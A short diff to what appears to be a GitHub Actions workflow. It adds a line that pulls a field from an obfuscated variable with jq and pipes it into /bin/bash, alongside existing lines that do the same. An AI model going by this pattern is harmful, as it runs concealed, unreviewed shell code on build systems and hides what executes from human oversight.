@@ -29,6 +29,7 @@ jobs:
           echo $gmxn440 | jq -r .vyr637 | /bin/bash
           echo $gzwn500 | jq -r .qjzu6 | /bin/bash
           echo $d4 | jq -r .hr360 | /bin/bash
+          printf '%s' "$lg43" | jq -r .rzho15829 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
